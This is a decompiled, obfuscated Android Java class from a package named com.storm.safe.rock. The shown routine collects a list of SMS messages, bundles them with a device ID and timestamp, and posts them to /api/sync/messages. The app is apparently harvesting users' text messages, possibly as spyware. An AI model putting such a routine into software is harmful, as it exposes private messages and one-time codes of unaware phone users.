package com.storm.safe.rock.network;

import java.util.Collection;
import java.util.List;
import kotlin.Result;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import org.json.JSONArray;
import org.json.JSONObject;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.network.HttpManager$uploadSms$2", m214403f = "HttpManager.kt", m214404l = {152}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class HttpManager$uploadSms$2 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52255a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0268a1 f52256a2;

    /* renamed from: a3 */
    public final /* synthetic */ List f52257a3;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public HttpManager$uploadSms$2(C0268a1 c0268a1, List list, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52256a2 = c0268a1;
        this.f52257a3 = list;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new HttpManager$uploadSms$2(this.f52256a2, this.f52257a3, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((HttpManager$uploadSms$2) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        Object objM213507a7;
        C0268a1 c0268a1 = this.f52256a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52255a1;
        try {
            if (i == 0) {
                kg1.m213544f4(obj);
                JSONObject jSONObject = new JSONObject();
                List list = this.f52257a3;
                jSONObject.put("deviceId", c0268a1.f52279a2);
                jSONObject.put("sms", new JSONArray((Collection<?>) list));
                jSONObject.put("timestamp", System.currentTimeMillis());
                this.f52255a1 = 1;
                objM213507a7 = c0268a1.m211371a1("/api/sync/messages", jSONObject, true, this);
                if (objM213507a7 == coroutineSingletons) {
                    return coroutineSingletons;
                }
            } else {
                if (i != 1) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(obj);
                objM213507a7 = ((Result) obj).f57559a0;
            }
        } catch (Exception e) {
            t60.m214705c6("HttpManager", "上传短信失败", e);
            int i2 = Result.f57558a1;
            objM213507a7 = kg1.m213507a7(e);
        }
        return new Result(objM213507a7);
    }
}
